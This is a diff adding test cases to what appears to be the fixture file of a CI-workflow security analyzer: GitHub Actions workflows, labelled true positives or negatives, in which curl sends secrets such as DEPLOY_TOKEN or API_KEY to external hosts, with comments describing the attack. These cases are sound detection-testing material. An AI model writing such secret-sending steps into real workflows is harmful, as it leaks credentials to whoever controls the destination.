@@ -32327,7 +32327,8 @@
           "incidents": [],
           "fixes": [],
           "fact_kinds": [
-            "request.destination-trusted"
+            "request.destination-trusted",
+            "repo.fork-pr-secrets"
           ],
           "true_positives": [
             {
@@ -32369,6 +32370,11 @@
               "input_kind": "workflow",
               "name": "untrusted-destination.element-before-command.yml",
               "text": "# situation: on push, a step sends the secret API_KEY to hooks.example.com\n#   with curl, after an assignment of an element of an array before the\n#   command word (a[0]=x curl ...).\n# reason: bash refuses the assignment of the element before the command word\n#   and runs curl, which carries the secret to the host.\n# attack: the attacker takes over the server of the destination, by a breach\n#   of the vendor or by registering the domain when the domain lapses.\n# attack-run-behavior: curl sends the secret to hooks.example.com, whose\n#   server, now the attacker's, logs the secret.\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          API_KEY: ${{ secrets.API_KEY }}\n        run: |\n          a[0]=x curl -fsS -H \"x-apikey: $API_KEY\" https://hooks.example.com/\n"
+            },
+            {
+              "input_kind": "workflow",
+              "name": "untrusted-destination.fork-pr-secrets.yml",
+              "text": "# situation: on pull_request, a job that runs only when the head repository\n#   of the pull request is a fork sends the value of secrets.DEPLOY_TOKEN\n#   with curl to a host that the variable DEPLOY_HOST names; the settings of\n#   the private repository send secrets to the workflow runs for pull\n#   requests from forks (repo.fork-pr-secrets true).\n# reason: the workflow run for a pull request from a fork gets DEPLOY_TOKEN,\n#   so the request carries the secret to the host, and no file of facts says\n#   that the host is trusted with the secret.\n# attack: whoever runs the server of the host that DEPLOY_HOST names, or\n#   takes the server over, reads the Authorization header of the request.\n# attack-run-behavior: a pull request from a fork starts the job, and curl\n#   sends Authorization: Bearer with the value of DEPLOY_TOKEN to the host.\non: pull_request\njobs:\n  j:\n    if: github.event.pull_request.head.repo.fork\n    runs-on: ubuntu-latest\n    env:\n      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n    steps:\n      - run: |\n          curl -fsS -H \"Authorization: Bearer $DEPLOY_TOKEN\" \"https://${{ vars.DEPLOY_HOST }}/status\"\n"
             },
             {
               "input_kind": "workflow",
@@ -32442,6 +32448,11 @@
             }
           ],
           "true_negatives": [
+            {
+              "input_kind": "workflow",
+              "name": "untrusted-destination.fork-only.yml",
+              "text": "# situation: on pull_request, a job that runs only when the head repository\n#   of the pull request is a fork sends the value of secrets.DEPLOY_TOKEN\n#   with curl to a host that the variable DEPLOY_HOST names; the repository\n#   does not send secrets to the workflow runs for pull requests from forks\n#   (repo.fork-pr-secrets false).\n# reason: in a base repository that is not a fork, the job runs only for a\n#   pull request from a fork, and such a workflow run has no secret except\n#   GITHUB_TOKEN; DEPLOY_TOKEN is empty, so the request carries no secret to\n#   the host.\n# attack: whoever runs the server of the host that DEPLOY_HOST names reads\n#   the Authorization header of the request.\n# attack-run-behavior: a pull request from a branch of the repository does\n#   not start the job; a pull request from a fork starts the job, and curl\n#   sends Authorization: Bearer with an empty value.\non: pull_request\njobs:\n  j:\n    if: github.event.pull_request.head.repo.fork\n    runs-on: ubuntu-latest\n    env:\n      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n    steps:\n      - run: |\n          curl -fsS -H \"Authorization: Bearer $DEPLOY_TOKEN\" \"https://${{ vars.DEPLOY_HOST }}/status\"\n"
+            },
             {
               "input_kind": "workflow",
               "name": "untrusted-destination.github.yml",
